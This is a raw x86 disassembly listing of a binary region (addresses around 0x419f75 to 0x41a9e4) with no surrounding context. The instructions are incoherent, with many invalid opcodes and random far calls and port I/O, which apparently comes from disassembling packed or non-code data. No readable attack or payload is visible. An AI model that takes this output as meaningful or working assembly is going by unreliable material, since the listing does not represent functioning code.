  419f75:	push   ds
  419f76:	lock pusha 
  419f78:	and    eax,0xf88bae3
  419f7d:	mov    ah,0xe0
  419f7f:	and    BYTE PTR [ebp-0x68c7d10d],ah
  419f85:	sub    eax,0xf84bd471
  419f8a:	cmc    
  419f8b:	in     eax,0xf4
  419f8d:	into   
  419f8e:	pop    esp
  419f8f:	and    BYTE PTR [esi+edx*4-0x50],ch
  419f93:	jns    0x419f21
  419f95:	add    edi,ebx
  419f97:	retf   0xea93
  419f9a:	jp     0x419f90
  419f9c:	out    0x21,al
  419f9e:	sbb    esp,DWORD PTR [edi+0x40]
  419fa1:	adc    BYTE PTR ds:0x641ac285,dh
  419fa7:	inc    ebp
  419fa8:	aam    0xa7
  419faa:	test   eax,0xe6142e25
  419faf:	or     edi,DWORD PTR [edi]
  419fb1:	loope  0x419fb3
  419fb3:	cmove  eax,DWORD PTR [eax]
	...
  41a016:	dec    esi
  41a017:	jmp    0x41a043
  41a019:	dec    esi
  41a01a:	scas   eax,DWORD PTR es:[edi]
  41a01b:	iret   
  41a01c:	outs   dx,BYTE PTR ds:[esi]
  41a01d:	jmp    0x41a015
  41a01f:	in     al,dx
  41a020:	pop    ds
  41a021:	outs   dx,DWORD PTR ds:[esi]
  41a022:	in     eax,dx
  41a023:	push   cs
  41a024:	popf   
  41a025:	pushf  
  41a026:	mov    ah,0x11
  41a028:	add    DWORD PTR [eax],eax
  41a02a:	pop    es
  41a02b:	add    DWORD PTR [eax],eax
  41a02d:	add    BYTE PTR [eax],ah
  41a02f:	xor    edi,DWORD PTR [ecx+0x27]
  41a032:	dec    ebx
  41a033:	push   es
  41a034:	dec    ebx
  41a035:	bound  ecx,QWORD PTR cs:[edx-0x79110c46]
  41a03c:	cdq    
  41a03d:	int3   
  41a03e:	and    esi,DWORD PTR [ebp+esi*2+0x5d382b96]
  41a045:	out    0xca,al
  41a047:	(bad)  
  41a048:	sbb    DWORD PTR [ebx],eax
  41a04a:	dec    eax
  41a04b:	mov    ecx,0xbb4c1c9f
  41a050:	inc    edx
  41a051:	call   0x29d5:0x1c17e6d
  41a058:	and    al,0x14
  41a05a:	loope  0x41a051
  41a05c:	and    eax,0x5f7bd545
  41a061:	pop    ss
  41a062:	dec    ebx
  41a063:	adc    al,0x31
  41a065:	mov    edi,0x743e6c9d
  41a06a:	or     dh,al
  41a06c:	cmp    BYTE PTR [esi+0x2e],dh
  41a06f:	lock call 0xac404922
  41a075:	pop    es
  41a076:	lods   eax,DWORD PTR ds:[esi]
  41a077:	and    eax,0x25ad9078
  41a07c:	or     cl,0xfe
  41a07f:	jmp    0xed6818ab
  41a084:	xchg   ebx,eax
  41a085:	nop    DWORD PTR [esi]
  41a088:	push   eax
  41a089:	and    esp,DWORD PTR [edi+0x71]
  41a08c:	mov    ah,0xb7
  41a08e:	in     al,0x85
  41a090:	or     al,0x94
  41a092:	or     al,0x62
  41a094:	call   0xd0e1805b
  41a099:	les    ebp,FWORD PTR [eax+0x49]
  41a09c:	mov    eax,0x584dc5db
  41a0a1:	add    dl,BYTE PTR [edi-0x17]
  41a0a4:	retf   0x5f4f
  41a0a7:	add    BYTE PTR [ebx-0x7a],0xa7
  41a0ab:	add    DWORD PTR [ebx+0x6e13a110],esi
  41a0b1:	clc    
  41a0b2:	out    0x13,al
  41a0b4:	outs   dx,BYTE PTR ds:[esi]
  41a0b5:	mov    ebp,fs
  41a0b7:	fs mov ebx,0x474fb737
  41a0bd:	leave  
  41a0be:	cwde   
  41a0bf:	mov    dh,0x43
  41a0c1:	mov    cl,0xc4
  41a0c3:	cmp    al,0xee
  41a0c5:	or     DWORD PTR [eax+0x34],esp
  41a0c8:	jns    0x41a05e
  41a0ca:	loop   0x41a069
  41a0cc:	out    0x52,al
  41a0ce:	add    eax,DWORD PTR [edi]
  41a0d0:	mov    DWORD PTR [ebp+0x5],edx
  41a0d3:	leave  
  41a0d4:	mov    esi,ebp
  41a0d6:	mov    ah,0xb9
  41a0d8:	imul   esp,DWORD PTR [ebx+0x2018155e],0x7cb3aa63
  41a0e2:	jae    0x41a0f9
  41a0e4:	jmp    0x41a067
  41a0e6:	or     eax,0x75a67e09
  41a0eb:	and    ah,BYTE PTR [ecx+edi*8-0x4f7c1582]
  41a0f2:	jmp    0xf83f:0x3daa7f53
  41a0f9:	mov    ebp,0x4fb14e44
  41a0fe:	inc    ecx
  41a0ff:	loop   0x41a178
  41a101:	maskmovq mm6,(bad)
  41a102:	div    DWORD PTR [ecx]
  41a104:	sub    ebp,edx
  41a106:	adc    DWORD PTR [ecx-0x61],0x5
  41a10a:	mov    ebp,0x4672a7be
  41a10f:	push   esp
  41a110:	(bad)  
  41a112:	ss mov bl,0xb4
  41a115:	stos   DWORD PTR es:[edi],eax
  41a116:	clc    
  41a117:	sub    DWORD PTR ds:0xbe86a676,edx
  41a11d:	mov    ecx,0x92ac0a46
  41a122:	add    ch,dl
  41a124:	inc    esi
  41a125:	pop    ebp
  41a126:	xchg   BYTE PTR [edx+0x7f],dl
  41a129:	adc    DWORD PTR [esi+0x61a8dcfe],0xffffff9a
  41a130:	idiv   ecx
  41a132:	repz mov dl,0x0
	...
  41a196:	sbb    al,0xc
  41a198:	std    
  41a199:	sbb    ebp,edi
  41a19b:	stc    
  41a19c:	cld    
  41a19d:	or     eax,0xe0cd0383
  41a1a2:	into   
  41a1a3:	cmp    ebp,eax
  41a1a5:	ins    BYTE PTR es:[edi],dx
  41a1a6:	mov    ebx,0x7000112
  41a1ab:	add    DWORD PTR [eax],eax
  41a1ad:	add    dl,dh
  41a1af:	xchg   BYTE PTR [eax+edi*2-0x2f43daa6],dl
  41a1b6:	neg    DWORD PTR [ecx]
  41a1b8:	mov    al,0x2
  41a1ba:	adc    BYTE PTR [esi+ebx*8-0x47961c8f],ch
  41a1c1:	dec    esp
  41a1c2:	push   ebx
  41a1c3:	retf   0x3491
  41a1c6:	in     al,0xe
  41a1c8:	cmc    
  41a1c9:	mov    eax,ds:0x8bcb1fb6
  41a1ce:	test   BYTE PTR [edi-0x767ca189],dh
  41a1d4:	ret    
  41a1d5:	sbb    edi,eax
  41a1d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1d8:	js     0x41a168
  41a1da:	call   0x887e188c
  41a1df:	into   
  41a1e0:	push   ss
  41a1e1:	inc    esp
  41a1e2:	shl    BYTE PTR [edx+0x8b4c3ae],cl
  41a1e8:	cmc    
  41a1e9:	call   0xcb10:0xb9f60cc
  41a1f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1f1:	adc    dl,ch
  41a1f3:	iret   
  41a1f4:	jmp    0x41a228
  41a1f6:	cs int 0x1b
  41a1f9:	inc    ebp
  41a1fa:	fisttp DWORD PTR [eax+esi*1]
  41a1fd:	sub    bl,BYTE PTR [edi-0x78]
  41a200:	push   ds
  41a201:	xchg   edi,eax
  41a202:	imul   esp,DWORD PTR [eax-0x76c1701],0x775c2b4b
  41a20c:	adc    bl,BYTE PTR [ebx+0x48]
  41a20f:	or     al,0x14
  41a211:	sbb    BYTE PTR [edi],al
  41a213:	loopne 0x41a232
  41a215:	xchg   ecx,eax
  41a216:	mov    ebx,0x65ae82d8
  41a21b:	mov    edx,0xc1a9732e
  41a220:	sub    BYTE PTR [edi-0x53],dh
  41a223:	int    0x9d
  41a225:	(bad)  
  41a226:	mov    ds:0xb3c445df,eax
  41a22b:	enter  0x3232,0x60
  41a22f:	mov    BYTE PTR [edx+0x6e5d48c9],al
  41a235:	les    esi,FWORD PTR [edi-0x4670c719]
  41a23b:	sub    ebx,esp
  41a23d:	adc    BYTE PTR [eax+ebp*4+0x59eecaef],ah
  41a244:	or     cx,ax
  41a247:	adc    eax,0xd20d3a82
  41a24c:	xchg   ecx,eax
  41a24d:	jb     0x41a2b4
  41a24f:	ja     0x41a271
  41a251:	aaa    
  41a252:	shl    DWORD PTR [ebx],cl
  41a254:	jl     0x41a254
  41a256:	push   esi
  41a257:	ret    0xb687
  41a25a:	push   cs
  41a25b:	lahf   
  41a25c:	sub    eax,0x4144baa4
  41a261:	fisttp WORD PTR [eax+0x57c139cd]
  41a267:	pop    edi
  41a268:	jecxz  0x41a2c2
  41a26a:	(bad)  
  41a26b:	pop    ds
  41a26c:	stos   DWORD PTR es:[edi],eax
  41a26d:	mov    esi,0xdf1fa897
  41a272:	imul   eax,DWORD PTR [edi-0x73f4102b],0x39
  41a279:	aad    0xc
  41a27b:	ins    DWORD PTR es:[edi],dx
  41a27c:	push   ss
  41a27d:	rcl    BYTE PTR [edx-0x52],cl
  41a280:	lods   eax,DWORD PTR ds:[esi]
  41a281:	pop    eax
  41a282:	aaa    
  41a283:	sub    eax,0x228857f7
  41a288:	cdq    
  41a289:	int3   
  41a28a:	xor    esi,DWORD PTR [eax+0x4ab61758]
  41a290:	call   0xd9854cc7
  41a295:	ret    
  41a296:	loopne 0x41a261
  41a298:	mov    ebx,0x707f3bf3
  41a29d:	fistp  QWORD PTR [ebx+0xf]
  41a2a0:	push   eax
  41a2a1:	mov    al,ds:0x5a3aef7
  41a2a6:	add    al,0x5
  41a2a8:	dec    esi
  41a2a9:	jmp    0x69f83f9b
  41a2ae:	jmp    0x893a:0xeadfdab9
	...
  41a315:	add    bh,dh
  41a317:	pop    eax
  41a318:	test   al,0x13
  41a31a:	scas   eax,DWORD PTR es:[edi]
  41a31b:	repz (bad) 
  41a31d:	cld    
  41a31e:	arpl   ax,bx
  41a320:	shl    DWORD PTR [eax+0x1ea99b7],0xc2
  41a327:	adc    eax,DWORD PTR [ecx]
  41a329:	add    BYTE PTR [edi],al
  41a32b:	add    DWORD PTR [eax],eax
  41a32d:	add    BYTE PTR [edx-0xf5100e5],al
  41a333:	jnp    0x41a322
  41a335:	push   edx
  41a336:	es (bad) 
  41a338:	mov    ds:0x57944b9,al
  41a33d:	ret    0x1c9
  41a340:	xchg   BYTE PTR [esi+0x7c8804e2],dl
  41a346:	adc    dl,BYTE PTR [edx-0x2c]
  41a349:	nop
  41a34a:	push   cs
  41a34b:	mov    al,al
  41a34d:	adc    bh,BYTE PTR [edi+0x1572cec4]
  41a353:	cld    
  41a354:	sbb    ah,BYTE PTR [esi-0x54454217]
  41a35a:	or     dh,BYTE PTR [edi]
  41a35c:	pop    edi
  41a35d:	sub    al,0xf
  41a35f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a360:	add    DWORD PTR [edx],esp
  41a362:	inc    ebx
  41a363:	aam    0x29
  41a365:	mul    al
  41a367:	add    DWORD PTR [ebx],esp
  41a369:	ret    
  41a36a:	adc    BYTE PTR [eax-0x60],ch
  41a36d:	jns    0x41a337
  41a36f:	xor    bh,BYTE PTR [esi+ebx*4+0x3c70935d]
  41a376:	push   0x18
  41a378:	ins    DWORD PTR es:[edi],dx
  41a379:	dec    edi
  41a37a:	test   eax,0x97b34891
  41a37f:	(bad)  
  41a380:	sbb    eax,DWORD PTR ds:0xc697b8d8
  41a386:	mov    eax,0xca30efb9
  41a38b:	fs pop ebp
  41a38d:	fcom   DWORD PTR [ebx+0x1cf4d679]
  41a393:	loope  0x41a33b
  41a395:	mov    ss,WORD PTR [eax]
  41a397:	sbb    dh,bh
  41a399:	aam    0x1c
  41a39b:	test   eax,0xceacde30
  41a3a0:	push   es
  41a3a1:	rcl    DWORD PTR ss:[esi+0x4],1
  41a3a5:	ret    0x4dbb
  41a3a8:	lahf   
  41a3a9:	adc    eax,0x5dfc6dc7
  41a3ae:	mov    ch,0x66
  41a3b0:	jbe    0x41a346
  41a3b2:	adc    eax,0xf8e11704
  41a3b7:	jp     0x41a34d
  41a3b9:	lahf   
  41a3ba:	ja     0x41a34d
  41a3bc:	aas    
  41a3bd:	push   0xffffffdf
  41a3bf:	bound  eax,QWORD PTR [ebx+0x6e4c7f67]
  41a3c5:	cdq    
  41a3c6:	fwait
  41a3c7:	iret   
  41a3c8:	test   al,0x70
  41a3ca:	pop    ds
  41a3cb:	add    al,BYTE PTR [ebx]
  41a3cd:	(bad)  
  41a3cf:	jmp    0x192d4ac
  41a3d4:	mov    ds:0x523613d3,eax
  41a3d9:	mov    eax,ds:0x6bd3923b
  41a3de:	add    BYTE PTR ds:0x641e536d,bl
  41a3e4:	test   eax,0xba3d580a
  41a3e9:	int3   
  41a3ea:	retf   
  41a3eb:	ins    BYTE PTR es:[edi],dx
  41a3ec:	test   eax,0x4809e201
  41a3f1:	call   0x51f24ecf
  41a3f6:	dec    edx
  41a3f7:	(bad)  
  41a3f9:	addr16 stc 
  41a3fb:	adc    al,al
  41a3fd:	and    ebp,DWORD PTR [ecx-0x668d1d95]
  41a403:	add    cl,ah
  41a405:	inc    ebx
  41a407:	mov    eax,0xa030257d
  41a40c:	repnz fist WORD PTR [eax+0x14]
  41a410:	test   al,0x9f
  41a412:	leave  
  41a413:	arpl   WORD PTR [eax],ax
  41a415:	add    ebp,ebx
  41a417:	ror    bl,cl
  41a419:	pop    es
  41a41a:	fs push ss
  41a41c:	mov    cl,bh
  41a41e:	mov    dl,0x77
  41a420:	xchg   edi,eax
  41a421:	stc    
  41a422:	je     0x41a45b
  41a424:	(bad)  
  41a425:	aad    0x88
  41a427:	adc    esi,DWORD PTR [edx+0x67]
  41a42a:	lds    edx,FWORD PTR ds:0xb35f38fe
  41a430:	lahf   
  41a431:	fwait
  41a432:	lods   eax,DWORD PTR ds:[esi]
  41a433:	mov    eax,0x8d
	...
  41a494:	add    BYTE PTR [eax],al
  41a496:	mov    edi,0xff0fcf82
  41a49b:	dec    edi
  41a49c:	push   DWORD PTR [edx+0x6df04d13]
  41a4a2:	scas   al,BYTE PTR es:[edi]
  41a4a3:	retw   
  41a4a5:	adc    ecx,ecx
  41a4a7:	adc    al,0x1
  41a4a9:	add    BYTE PTR [edi],al
  41a4ab:	add    DWORD PTR [eax],eax
  41a4ad:	add    BYTE PTR [ecx],bl
  41a4af:	mov    dh,0x17
  41a4b1:	jno    0x41a443
  41a4b3:	cld    
  41a4b4:	xor    BYTE PTR [ecx+0x7c8bf0dd],cl
  41a4ba:	shl    DWORD PTR [eax],1
  41a4bc:	dec    ebx
  41a4bd:	imul   ebp,DWORD PTR [ebp+0x23],0x75
  41a4c1:	aas    
  41a4c2:	dec    edx
  41a4c3:	sti    
  41a4c4:	sbb    ebp,edi
  41a4c6:	js     0x41a4fc
  41a4c8:	clc    
  41a4c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4ca:	pop    ds
  41a4cb:	dec    esp
  41a4cc:	enter  0x4fba,0xb6
  41a4d0:	xlat   BYTE PTR ds:[ebx]
  41a4d1:	fcom   QWORD PTR [edx]
  41a4d3:	outs   dx,BYTE PTR ds:[esi]
  41a4d4:	mov    WORD PTR [esi+0x18],gs
  41a4d7:	arpl   WORD PTR [edx-0x3a05e1f1],si
  41a4dd:	mov    ebp,0xf059d521
  41a4e2:	xchg   edx,eax
  41a4e3:	out    dx,eax
  41a4e4:	leave  
  41a4e5:	pop    edi
  41a4e6:	xor    bh,bl
  41a4e8:	std    
  41a4e9:	ret    
  41a4ea:	(bad)  
  41a4eb:	das    
  41a4ec:	adc    al,0x33
  41a4ee:	mov    eax,DWORD PTR [eax-0x566622c6]
  41a4f4:	bound  edx,QWORD PTR [eax+0x7f]
  41a4f7:	and    eax,0xf602c2b2
  41a4fc:	pusha  
  41a4fd:	mov    BYTE PTR [esi+0x74697962],dl
  41a503:	pop    ss
  41a504:	or     BYTE PTR [edx+0xb3f88e9],ah
  41a50a:	and    DWORD PTR [ebx+0x84a852d],ecx
  41a510:	sbb    al,0xea
  41a512:	dec    eax
  41a513:	test   eax,0x22fd735f
  41a518:	inc    esi
  41a519:	std    
  41a51a:	dec    edi
  41a51b:	inc    ebp
  41a51c:	or     DWORD PTR [edx-0x49d0799b],edi
  41a522:	add    DWORD PTR [edi+ecx*8-0x25659b9d],ecx
  41a529:	xchg   dl,dl
  41a52b:	or     BYTE PTR [esi+0x98d2b27],ch
  41a531:	mov    esp,0x352460db
  41a536:	retf   
  41a537:	dec    ebx
  41a538:	gs push 0xdbd15186
  41a53e:	pop    es
  41a53f:	sub    eax,0xa95f0ac1
  41a544:	push   ebp
  41a545:	(bad)  
  41a546:	cmovp  ebx,DWORD PTR [ebx+0x9395587]
  41a54d:	xor    eax,DWORD PTR ds:0x7a7840ff
  41a553:	outs   dx,DWORD PTR ds:[esi]
  41a554:	cmp    DWORD PTR [ecx+0x42],eax
  41a557:	push   ebp
  41a558:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a559:	shl    DWORD PTR [ebx-0x70],1
  41a55c:	aam    0x91
  41a55e:	jg     0x41a593
  41a560:	out    0xc4,eax
  41a562:	aas    
  41a563:	mov    edi,0xab318cb6
  41a568:	mov    ds:0xfe9583e8,al
  41a56d:	test   DWORD PTR [edi],esp
  41a56f:	sbb    ch,BYTE PTR [ebp+0x51c1f368]
  41a575:	frstor [edx+0x5d]
  41a578:	sub    al,0x10
  41a57a:	(bad)  
  41a57b:	bound  ebp,QWORD PTR [edi-0x59474ecc]
  41a581:	mov    bl,0xb8
  41a583:	jbe    0x41a58a
  41a585:	das    
  41a586:	add    ebx,0xffffffc6
  41a589:	jmp    0x1b66:0x38253c6
  41a590:	cmp    DWORD PTR [ebp+0x7bb167e],esi
  41a596:	out    0x61,al
  41a598:	mov    ch,0x6e
  41a59a:	mov    esi,DWORD PTR ds:0x7bbcc1b4
  41a5a0:	ja     0x41a5c6
  41a5a2:	bound  edx,QWORD PTR [edx+0x7f4a79ea]
  41a5a8:	dec    ebp
  41a5a9:	loop   0x41a5ac
  41a5ab:	or     eax,0xe089dc3b
  41a5b0:	test   DWORD PTR [esp+edx*4+0x2e],esp
  41a5b4:	push   eax
	...
  41a615:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a619:	inc    ecx
  41a61a:	ja     0x41a687
  41a61c:	pop    esp
  41a61d:	aas    
  41a61e:	pop    ecx
  41a61f:	jmp    0x41a5e9
  41a621:	mov    edx,0x2bd07e78
  41a626:	rcl    BYTE PTR ds:0x1070001,1
  41a62c:	add    BYTE PTR [eax],al
  41a62e:	ins    DWORD PTR es:[edi],dx
  41a62f:	or     BYTE PTR [eax+0x59fd1301],dl
  41a635:	mov    ah,0xee
  41a637:	jecxz  0x41a650
  41a639:	sub    eax,0xdd9350a7
  41a63e:	jecxz  0x41a611
  41a640:	loope  0x41a62a
  41a642:	imul   ebx,DWORD PTR [esi+0x4],0x61
  41a646:	sbb    eax,0x8c1172c3
  41a64b:	addr16 lahf 
  41a64d:	retf   0x7769
  41a650:	jb     0x41a672
  41a652:	mov    dh,0x6b
  41a654:	cmp    al,0x3f
  41a656:	test   al,0xba
  41a658:	int    0xe6
  41a65a:	adc    ch,BYTE PTR [ebp+0x7b18eab4]
  41a660:	jl     0x41a644
  41a662:	pop    ss
  41a663:	push   ecx
  41a664:	jmp    0x4960:0x9102d46e
  41a66b:	mov    al,ds:0x5e96ecdc
  41a670:	dec    edi
  41a671:	add    dl,BYTE PTR [edi-0x2b]
  41a674:	daa    
  41a675:	adc    eax,0xb8045a69
  41a67a:	test   BYTE PTR [edx-0x31c6cb22],dl
  41a680:	pushf  
  41a681:	push   0x424bcd5f
  41a686:	xor    esp,0x9cae1e75
  41a68c:	mov    ds:0x579e3667,eax
  41a691:	inc    ebx
  41a692:	in     eax,0x3e
  41a694:	daa    
  41a695:	jp     0x41a636
  41a697:	mov    ds:0xd1775aa,al
  41a69c:	xchg   esp,eax
  41a69d:	out    0x2a,al
  41a69f:	icebp  
  41a6a0:	mov    WORD PTR ds:0xadceea08,ss
  41a6a6:	cmc    
  41a6a7:	xlat   BYTE PTR ds:[ebx]
  41a6a8:	rcr    BYTE PTR [ebx-0x40],0x73
  41a6ac:	fxch   st(3)
  41a6ae:	out    dx,al
  41a6af:	test   DWORD PTR [eax+esi*8-0x2fdf516b],edi
  41a6b6:	stos   BYTE PTR es:[edi],al
  41a6b7:	xor    ah,BYTE PTR ds:0xb8bc62df
  41a6bd:	push   ebx
  41a6be:	pushf  
  41a6bf:	mov    eax,ds:0x85afde98
  41a6c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6c5:	adc    eax,0x9ddc0bb5
  41a6ca:	mov    dl,0xb5
  41a6cc:	push   0x852312c4
  41a6d1:	pop    esp
  41a6d2:	leave  
  41a6d3:	add    ebp,DWORD PTR [edx]
  41a6d5:	arpl   di,dx
  41a6d7:	sub    esp,edx
  41a6d9:	rcr    DWORD PTR [edi],1
  41a6db:	cmp    al,BYTE PTR [edx-0x7f]
  41a6de:	clc    
  41a6df:	bnd call 0x1a97abb9
  41a6e5:	(bad)  
  41a6e6:	out    dx,al
  41a6e7:	dec    ebx
  41a6e8:	add    BYTE PTR [ebx-0x66],dh
  41a6eb:	mov    dl,0xaa
  41a6ed:	stos   DWORD PTR es:[edi],eax
  41a6ee:	dec    ebx
  41a6ef:	ret    0x53e3
  41a6f2:	xchg   edx,eax
  41a6f3:	sub    ch,al
  41a6f5:	or     al,0x47
  41a6f7:	lods   eax,DWORD PTR ds:[esi]
  41a6f8:	jnp    0x41a704
  41a6fa:	(bad)  
  41a6fb:	or     edx,eax
  41a6fd:	mov    edx,0xa8c5d998
  41a702:	popa   
  41a703:	push   0xffffffb6
  41a705:	sbb    DWORD PTR [ebp-0x632ba216],ecx
  41a70b:	or     eax,DWORD PTR [ebp+edi*4+0x78]
  41a70f:	mov    ebx,DWORD PTR [ebx]
  41a711:	iret   
  41a712:	out    dx,eax
  41a713:	or     cl,BYTE PTR [esi+0x3b]
  41a716:	sbb    eax,0x1beed5ee
  41a71b:	cdq    
  41a71c:	xchg   ebp,eax
  41a71d:	xchg   esi,eax
  41a71e:	and    eax,0x2f603097
  41a723:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a724:	fwait
  41a725:	into   
  41a726:	pop    ds
  41a727:	adc    dh,BYTE PTR [edi+eax*4]
  41a72a:	mov    dl,0x9
  41a72c:	in     eax,dx
  41a72d:	aas    
  41a72e:	ds xor eax,0xb2cbf496
  41a734:	jp     0x41a736
	...
  41a796:	repz xchg edi,eax
  41a798:	jae    0x41a721
  41a79a:	ja     0x41a783
  41a79c:	div    edi
  41a79e:	fisttp QWORD PTR [ebx+0x3f6950a8]
  41a7a4:	sbb    BYTE PTR [ebx],0xd7
  41a7a7:	push   ss
  41a7a8:	add    DWORD PTR [eax],eax
  41a7aa:	pop    es
  41a7ab:	add    DWORD PTR [eax],eax
  41a7ad:	add    BYTE PTR [ecx-0x85c9808],al
  41a7b3:	call   0x1cd9:0xb12a383e
  41a7ba:	mov    ebp,0xffd0962e
  41a7bf:	pop    eax
  41a7c0:	outs   dx,DWORD PTR ds:[esi]
  41a7c1:	sbb    BYTE PTR [edx+0x38169838],0x26
  41a7c8:	lods   al,BYTE PTR ds:[esi]
  41a7c9:	sbb    al,0x59
  41a7cb:	das    
  41a7cc:	push   esp
  41a7cd:	test   DWORD PTR [edi-0x45],ecx
  41a7d0:	in     eax,dx
  41a7d1:	pop    ss
  41a7d2:	xor    BYTE PTR [esi+0xd],dh
  41a7d5:	mov    ebx,0xeaac1fc3
  41a7da:	pushf  
  41a7db:	push   ebx
  41a7dc:	outs   dx,DWORD PTR ds:[esi]
  41a7dd:	aaa    
  41a7de:	je     0x41a781
  41a7e0:	add    DWORD PTR [edi-0xc620cf2],eax
  41a7e6:	jno    0x41a82d
  41a7e8:	jecxz  0x41a7ba
  41a7ea:	aad    0x95
  41a7ec:	leave  
  41a7ed:	call   0x46ef:0x9d2eef9f
  41a7f4:	(bad)  
  41a7f5:	fnstenv [ebx]
  41a7f7:	mov    cl,0x4d
  41a7f9:	repz call 0xaffed057
  41a7ff:	sbb    eax,0x61fa74e4
  41a804:	cmp    al,0x12
  41a806:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a807:	mov    ebp,0x9559acf9
  41a80c:	mov    esi,0xec1636fa
  41a811:	dec    ebp
  41a812:	xchg   ecx,eax
  41a813:	xchg   esi,eax
  41a814:	cmp    DWORD PTR [ecx-0x2a70acf9],ecx
  41a81a:	cwde   
  41a81b:	and    DWORD PTR [ecx+0x33],ebx
  41a81e:	int3   
  41a81f:	lods   eax,DWORD PTR ds:[esi]
  41a820:	sbb    DWORD PTR [eax-0x3],esi
  41a823:	mov    ebp,ecx
  41a825:	ja     0x41a7ed
  41a827:	jmp    0x41a879
  41a829:	stos   BYTE PTR es:[edi],al
  41a82a:	pop    ebp
  41a82b:	lock xor eax,0x6eb2f35d
  41a831:	mov    ah,0xc4
  41a833:	xchg   ebx,eax
  41a834:	sbb    al,BYTE PTR [edi]
  41a836:	xchg   esp,eax
  41a837:	mov    dl,bh
  41a839:	es add al,0x3f
  41a83c:	pop    edx
  41a83d:	jne    0x41a836
  41a83f:	jp     0x41a824
  41a841:	jmp    0x41a7f2
  41a843:	clc    
  41a844:	jecxz  0x41a82f
  41a846:	arpl   WORD PTR [ebx+0x72],ax
  41a849:	or     BYTE PTR [edi],cl
  41a84b:	test   al,0xe7
  41a84d:	sar    BYTE PTR [ecx-0x57],cl
  41a850:	(bad)  
  41a851:	xchg   ecx,eax
  41a852:	(bad)  
  41a853:	icebp  
  41a854:	inc    ebx
  41a855:	push   ebp
  41a856:	jl     0x41a815
  41a858:	pop    ebp
  41a859:	jno    0x41a818
  41a85b:	jnp    0x41a82b
  41a85d:	and    eax,0x31fbe010
  41a862:	push   ds
  41a863:	and    DWORD PTR [esp+esi*8+0x15],0x2d
  41a868:	xor    DWORD PTR cs:[ebx+0x7a14f12a],ebp
  41a86f:	jns    0x41a8d7
  41a871:	sqrtps xmm1,XMMWORD PTR [eax-0x7253c785]
  41a878:	icebp  
  41a879:	shl    BYTE PTR [edi-0x247d3b12],1
  41a87f:	or     DWORD PTR [edx+0x42],esp
  41a882:	out    0xe1,al
  41a884:	sub    al,0xb1
  41a886:	aam    0xfd
  41a888:	dec    edx
  41a889:	jbe    0x41a907
  41a88b:	fst    QWORD PTR [edx-0x14b100c4]
  41a891:	in     al,0xb
  41a893:	xor    bl,BYTE PTR [esi-0x594a2ad7]
  41a899:	cmp    al,0x77
  41a89b:	bound  esp,QWORD PTR ds:0xfd4d5ebb
  41a8a1:	scas   al,BYTE PTR es:[edi]
  41a8a2:	mov    eax,ds:0x1b1dfd41
  41a8a7:	mov    esi,0x4f71f29f
  41a8ac:	push   0xffffffa4
  41a8ae:	bound  ebx,QWORD PTR [eax+0x70]
  41a8b1:	dec    eax
  41a8b2:	sahf   
  41a8b3:	sub    ecx,ecx
	...
  41a915:	add    BYTE PTR ds:0xcf4a867e,dh
  41a91b:	cli    
  41a91c:	std    
  41a91d:	jg     0x41a90a
  41a91f:	mov    ds:0x6c9d323e,al
  41a924:	inc    eax
  41a925:	repnz ficom WORD PTR [edi]
  41a928:	add    DWORD PTR [eax],eax
  41a92a:	pop    es
  41a92b:	add    DWORD PTR [eax],eax
  41a92d:	add    BYTE PTR [edi-0x28],cl
  41a930:	in     eax,0x9
  41a932:	fnsave [esi+0x206d8ae9]
  41a938:	dec    esp
  41a939:	bound  edi,QWORD PTR [edx+0x2f]
  41a93c:	leave  
  41a93d:	lods   eax,DWORD PTR ds:[esi]
  41a93e:	ror    bl,0xc
  41a941:	mov    edi,0x4233e624
  41a946:	inc    esp
  41a947:	cmp    eax,0x347aabed
  41a94c:	mov    bh,0x4d
  41a94e:	xchg   esi,eax
  41a94f:	cmp    DWORD PTR [ebx+esi*8],ebp
  41a952:	stos   BYTE PTR es:[edi],al
  41a953:	pop    ds
  41a954:	(bad)  
  41a955:	jne    0x41a976
  41a957:	xchg   edi,eax
  41a958:	jne    0x41a9c1
  41a95a:	xor    eax,DWORD PTR [ecx+ebx*8]
  41a95d:	push   edi
  41a95e:	mov    ebx,0xb50e7768
  41a963:	pop    eax
  41a964:	adc    esp,ebx
  41a966:	out    0x9e,al
  41a968:	push   esp
  41a969:	test   DWORD PTR [edi+0x62],edi
  41a96c:	xchg   esp,eax
  41a96d:	mov    DWORD PTR [esi+esi*4+0x33],ebp
  41a971:	lock cmp BYTE PTR [esi+ecx*2+0x25f12530],ch
  41a979:	mov    esp,0xf564b47e
  41a97e:	push   ds
  41a97f:	cmp    dl,cl
  41a981:	jge    0x41a91c
  41a983:	mov    al,ds:0xd80e9afd
  41a988:	mov    ch,0x80
  41a98a:	fdiv   DWORD PTR [edi+eiz*2+0x637352a2]
  41a991:	adc    BYTE PTR ds:0xa8ae112a,0xe
  41a998:	sub    ah,bh
  41a99a:	retf   
  41a99b:	nop
  41a99c:	pop    ebx
  41a99d:	pop    ds
  41a99e:	nop
  41a99f:	idiv   DWORD PTR [edx+eiz*8+0x48]
  41a9a3:	fisttp WORD PTR [edi-0x4c]
  41a9a6:	xor    eax,0x66d2a94d
  41a9ab:	cli    
  41a9ac:	mov    ss,ebp
  41a9ae:	aam    0x25
  41a9b0:	ret    0x6488
  41a9b3:	addr16 je 0x41a9bd
  41a9b6:	sub    BYTE PTR [edi],ah
  41a9b8:	and    BYTE PTR [edx-0x19],al
  41a9bb:	mov    ebx,0x5d243e4d
  41a9c0:	cld    
  41a9c1:	(bad)  
  41a9c2:	int3   
  41a9c3:	aaa    
  41a9c4:	mov    ebp,0x23d97c51
  41a9c9:	test   eax,0x13341418
  41a9ce:	push   0x7e97c3ba
  41a9d3:	test   al,0x66
  41a9d5:	into   
  41a9d6:	ja     0x41a97f
  41a9d8:	xor    eax,0x5c6358ae
  41a9dd:	(bad)  
  41a9de:	fcomp  QWORD PTR [esi+0x5d]
  41a9e1:	jae    0x41a9dc
  41a9e3:	push   edi
  41a9e4:	out    0x8b,al
